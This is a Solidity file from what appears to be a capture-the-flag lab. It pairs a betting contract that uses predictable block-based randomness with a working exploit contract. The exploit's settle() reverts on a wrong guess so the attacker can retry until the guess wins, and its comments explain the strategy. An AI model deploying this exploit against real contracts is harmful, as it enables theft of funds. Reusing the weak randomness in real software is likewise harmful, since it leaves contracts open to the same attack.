// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract PredictTheFuture {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    constructor() payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == address(0));
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        ) % 10;

        guesser = address(0);
        if (guess == answer) {
            (bool ok, ) = msg.sender.call{value: 2 ether}("");
            require(ok, "Failed to send to msg.sender");
        }
    }
}

contract ExploitContract {
    PredictTheFuture public predictTheFuture;
    // From settle, the anwser could only in the range of (0~9), because of the (% 10) in the line 39.
    // We can guess one number through lockInGuess and  1 ether of mine is locked in PredictTheFuture.guess
    // After 2 blocks, the function settle can be called, but we'll lose the 1 ether if the guess fail, because it will reset the guesser.
    // As such, the key is find a way to maintain the guesser. It's a good idea to revert if settle failed.

    constructor(PredictTheFuture _predictTheFuture) {
        predictTheFuture = _predictTheFuture;
    }

    // Write your exploit code below

    function lockInGuess(uint8 n) public payable {
        require(address(this).balance == 1 ether, "balance not enough");
        predictTheFuture.lockInGuess{value: 1 ether}(n);
    }

    function settle() public {
        predictTheFuture.settle();
        require(predictTheFuture.isComplete(), "settle failed"); // revert if the settle failed, the guesser will maintain.
    }
    // Don't forget this!
    receive() external payable {

    }
}
